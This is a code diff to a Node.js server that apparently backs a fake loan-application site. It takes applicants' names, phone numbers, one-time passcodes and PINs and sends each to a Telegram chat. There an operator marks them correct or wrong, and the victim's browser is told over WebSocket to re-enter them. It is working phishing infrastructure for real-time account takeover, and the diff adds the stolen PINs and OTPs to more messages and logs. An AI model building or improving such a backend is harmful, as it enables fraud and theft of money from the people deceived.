@@ -4,10 +4,10 @@ const https = require('https');
 const { WebSocketServer, WebSocket } = require('ws');
 
 // ═══════════════════════════════════════════
-// CONFIG
+// CONFIG (from Render environment variables)
 // ═══════════════════════════════════════════
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;   
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 const PORT = process.env.PORT || 3000;
 
 // ═══════════════════════════════════════════
@@ -31,13 +31,15 @@ wss.on('connection', (ws, req) => {
 
     if (sessionId && sessions[sessionId]) {
         sessions[sessionId].ws = ws;
-        console.log('WS connected:', sessions[sessionId].name, sessionId);
+        console.log('✅ WS connected:', sessions[sessionId].name, sessionId);
+    } else {
+        console.log('⚠️ WS connected, no session:', sessionId);
     }
 
     ws.on('close', () => {
         if (sessionId && sessions[sessionId]) {
             sessions[sessionId].ws = null;
-            console.log('WS disconnected:', sessions[sessionId].name);
+            console.log('❌ WS disconnected:', sessions[sessionId].name);
         }
     });
 });
@@ -75,10 +77,10 @@ function sendTelegram(text, buttons) {
     if (buttons) body.reply_markup = { inline_keyboard: buttons };
     return tgRequest('POST', '/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', body)
         .then(res => {
-            if (res.ok) console.log('TG sent');
-            else console.error('TG error:', JSON.stringify(res));
+            if (res.ok) console.log('✅ TG sent');
+            else console.error('❌ TG error:', JSON.stringify(res));
         })
-        .catch(err => console.error('Network:', err.message));
+        .catch(err => console.error('❌ Network:', err.message));
 }
 
 function answerCallback(cqId, text) {
@@ -89,7 +91,7 @@ function answerCallback(cqId, text) {
 }
 
 // ═══════════════════════════════════════════
-// PAGE 1: Application
+// PAGE 1: Application (no buttons)
 // ═══════════════════════════════════════════
 app.post('/api/apply', async (req, res) => {
     const { name, phone, amount, period } = req.body;
@@ -109,15 +111,15 @@ app.post('/api/apply', async (req, res) => {
         otpVerified: false, pinVerified: false
     };
 
-    const msg = 'NEW LOAN APPLICATION\n' +
+    const msg = '📋 *NEW LOAN APPLICATION*\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + name + '\n' +
-        'Phone: ' + phone + '\n' +
-        'Amount: K' + amount.toLocaleString() + '\n' +
-        'Period: ' + period + ' days\n' +
-        'Interest: K' + interest.toLocaleString() + '\n' +
-        'Total Repay: K' + total.toLocaleString() + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '👤 *Name:* ' + name + '\n' +
+        '📱 *Phone:* ' + phone + '\n' +
+        '💰 *Amount:* K' + amount.toLocaleString() + '\n' +
+        '📅 *Period:* ' + period + ' days\n' +
+        '📊 *Interest:* K' + interest.toLocaleString() + '\n' +
+        '💵 *Total Repay:* K' + total.toLocaleString() + '\n' +
+        '🕐 *Time:* ' + new Date().toLocaleString('en-ZM') + '\n' +
         '━━━━━━━━━━━━━━━━━━';
 
     await sendTelegram(msg);
@@ -136,20 +138,20 @@ app.post('/api/otp', async (req, res) => {
     session.otp = otp;
     session.otpVerified = false;
 
-    const msg = 'OTP SUBMITTED\n' +
+    const msg = '📲 *OTP SUBMITTED*\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + session.name + '\n' +
-        'Phone: ' + session.phone + '\n' +
-        'Amount: K' + session.amount.toLocaleString() + '\n' +
-        'Period: ' + session.period + ' days\n' +
-        'OTP: ' + otp + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '👤 *Name:* ' + session.name + '\n' +
+        '📱 *Phone:* ' + session.phone + '\n' +
+        '💰 *Amount:* K' + session.amount.toLocaleString() + '\n' +
+        '📅 *Period:* ' + session.period + ' days\n' +
+        '🔢 *OTP:* ' + otp + '\n' +
+        '🕐 *Time:* ' + new Date().toLocaleString('en-ZM') + '\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
-        'Tap to verify OTP';
+        '_Tap below to verify_';
 
     const buttons = [[
-        { text: 'Correct OTP', callback_data: 'otp_correct:' + sessionId },
-        { text: 'Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
+        { text: '✅ Correct OTP', callback_data: 'otp_correct:' + sessionId },
+        { text: '❌ Wrong OTP', callback_data: 'otp_wrong:' + sessionId }
     ]];
 
     await sendTelegram(msg, buttons);
@@ -168,18 +170,18 @@ app.post('/api/pin', async (req, res) => {
     session.pin = pin;
     session.pinVerified = false;
 
-    const msg = 'PIN SUBMITTED\n' +
+    const msg = '🔐 *PIN SUBMITTED*\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
-        'Name: ' + session.name + '\n' +
-        'Phone: ' + session.phone + '\n' +
-        'PIN: ' + pin + '\n' +
-        'Time: ' + new Date().toLocaleString('en-ZM') + '\n' +
+        '👤 *Name:* ' + session.name + '\n' +
+        '📱 *Phone:* ' + session.phone + '\n' +
+        '🔑 *PIN:* ' + pin + '\n' +
+        '🕐 *Time:* ' + new Date().toLocaleString('en-ZM') + '\n' +
         '━━━━━━━━━━━━━━━━━━\n' +
-        'Tap to verify PIN';
+        '_Tap below to verify_';
 
     const buttons = [[
-        { text: 'Correct PIN', callback_data: 'pin_correct:' + sessionId },
-        { text: 'Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
+        { text: '✅ Correct PIN', callback_data: 'pin_correct:' + sessionId },
+        { text: '❌ Wrong PIN', callback_data: 'pin_wrong:' + sessionId }
     ]];
 
     await sendTelegram(msg, buttons);
@@ -187,7 +189,7 @@ app.post('/api/pin', async (req, res) => {
 });
 
 // ═══════════════════════════════════════════
-// TELEGRAM POLLING
+// TELEGRAM POLLING (handles button clicks)
 // ═══════════════════════════════════════════
 let offset = 0;
 
@@ -199,52 +201,116 @@ async function pollTelegram() {
             for (const update of data.result) {
                 offset = update.update_id + 1;
 
-                if (update.callback_query) {
-                    const cq = update.callback_query;
-                    const parts = cq.data.split(':');
-                    const action = parts[0] + '_' + parts[1];
-                    const sessionId = parts.slice(2).join(':');
-                    const session = sessions[sessionId];
+                if (!update.callback_query) continue;
 
-                    if (!session) {
-                        console.log('Unknown session:', sessionId);
-                        continue;
+                const cq = update.callback_query;
+                const parts = cq.data.split(':');
+                const action = parts[0] + '_' + parts[1];
+                const sessionId = parts.slice(2).join(':');
+                const session = sessions[sessionId];
+
+                if (!session) {
+                    console.log('⚠️ Unknown session:', sessionId);
+                    await answerCallback(cq.id, 'Session expired. Please re-apply.');
+                    continue;
+                }
+
+                // ─── OTP BUTTONS ───
+                if (action === 'otp_correct') {
+                    // 1. Acknowledge button press (shows toast in Telegram)
+                    await answerCallback(cq.id, '✅ OTP Approved!');
+
+                    // 2. Send confirmation to chat
+                    await sendTelegram(
+                        '✅ *OTP VERIFIED*\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 ' + session.name + '\n' +
+                        '📱 ' + session.phone + '\n' +
+                        '🔢 *OTP:* ' + session.otp + '\n' +
+                        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        'User moving to PIN verification…'
+                    );
+
+                    // 3. Tell user's browser via WebSocket
+                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
                     }
 
-                    await answerCallback(cq.id, 'Processing...');
+                    console.log('✅ OTP CORRECT:', session.name, session.otp);
 
-                    // OTP VERIFICATION
-                    if (action === 'otp_correct') {
-                        session.otpVerified = true;
-                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'correct' }));
-                        }
-                        await sendTelegram('OTP VERIFIED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nTime: ' + new Date().toLocaleString('en-ZM'));
-                        console.log('OTP correct:', session.name);
+                } else if (action === 'otp_wrong') {
+                    // 1. Acknowledge button press
+                    await answerCallback(cq.id, '❌ OTP Rejected. User notified.');
 
-                    } else if (action === 'otp_wrong') {
-                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                            session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
-                        }
-                        await sendTelegram('OTP REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter OTP\nTime: ' + new Date().toLocaleString('en-ZM'));
-                        console.log('OTP wrong:', session.name);
+                    // 2. Send confirmation to chat
+                    await sendTelegram(
+                        '❌ *OTP REJECTED*\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 ' + session.name + '\n' +
+                        '📱 ' + session.phone + '\n' +
+                        '🔢 *OTP:* ' + session.otp + '\n' +
+                        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '🔄 User asked to re-enter OTP'
+                    );
 
-                    // PIN VERIFICATION
-                    } else if (action === 'pin_correct') {
-                        session.pinVerified = true;
-                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
-                        }
-                        await sendTelegram('PIN VERIFIED - APPLICATION COMPLETE\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nK' + session.amount.toLocaleString() + ' / ' + session.period + ' days\nTime: ' + new Date().toLocaleString('en-ZM'));
-                        console.log('PIN correct:', session.name, 'COMPLETE');
-
-                    } else if (action === 'pin_wrong') {
-                        if (session.ws && session.ws.readyState === WebSocket.OPEN) {
-                            session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
-                        }
-                        await sendTelegram('PIN REJECTED\n━━━━━━━━━━━━━━━━━━\n' + session.name + '\n' + session.phone + '\nUser asked to re-enter PIN\nTime: ' + new Date().toLocaleString('en-ZM'));
-                        console.log('PIN wrong:', session.name);
+                    // 3. Tell user's browser via WebSocket
+                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                        session.ws.send(JSON.stringify({ type: 'otp_result', result: 'wrong' }));
                     }
+
+                    console.log('❌ OTP WRONG:', session.name, session.otp);
+
+                // ─── PIN BUTTONS ───
+                } else if (action === 'pin_correct') {
+                    // 1. Acknowledge button press
+                    await answerCallback(cq.id, '✅ PIN Approved! Application complete.');
+
+                    // 2. Send final confirmation to chat
+                    await sendTelegram(
+                        '🎉 *APPLICATION COMPLETE*\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 *Name:* ' + session.name + '\n' +
+                        '📱 *Phone:* ' + session.phone + '\n' +
+                        '💰 *Amount:* K' + session.amount.toLocaleString() + '\n' +
+                        '📅 *Period:* ' + session.period + ' days\n' +
+                        '🔑 *PIN:* ' + session.pin + '\n' +
+                        '🔢 *OTP:* ' + session.otp + '\n' +
+                        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '✅ All verified. Application submitted.'
+                    );
+
+                    // 3. Tell user's browser via WebSocket
+                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'correct' }));
+                    }
+
+                    console.log('✅ PIN CORRECT:', session.name, '— APPLICATION COMPLETE');
+
+                } else if (action === 'pin_wrong') {
+                    // 1. Acknowledge button press
+                    await answerCallback(cq.id, '❌ PIN Rejected. User notified.');
+
+                    // 2. Send confirmation to chat
+                    await sendTelegram(
+                        '❌ *PIN REJECTED*\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '👤 ' + session.name + '\n' +
+                        '📱 ' + session.phone + '\n' +
+                        '🔑 *PIN:* ' + session.pin + '\n' +
+                        '🕐 ' + new Date().toLocaleString('en-ZM') + '\n' +
+                        '━━━━━━━━━━━━━━━━━━\n' +
+                        '🔄 User asked to re-enter PIN'
+                    );
+
+                    // 3. Tell user's browser via WebSocket
+                    if (session.ws && session.ws.readyState === WebSocket.OPEN) {
+                        session.ws.send(JSON.stringify({ type: 'pin_result', result: 'wrong' }));
+                    }
+
+                    console.log('❌ PIN WRONG:', session.name, session.pin);
                 }
             }
         }
@@ -259,9 +325,11 @@ async function pollTelegram() {
 // ═══════════════════════════════════════════
 server.listen(PORT, () => {
     console.log('');
-    console.log('Server running on port ' + PORT);
-    console.log('WebSocket: /ws');
-    console.log('Telegram polling started');
+    console.log('🚀 Server running on port ' + PORT);
+    console.log('📡 WebSocket: /ws');
+    console.log('🤖 Telegram polling started');
+    console.log('🔑 Token set:', TELEGRAM_BOT_TOKEN ? 'YES' : 'NO (check env vars)');
+    console.log('👤 Chat ID:', TELEGRAM_CHAT_ID || 'NOT SET');
     console.log('');
     pollTelegram();
 });   
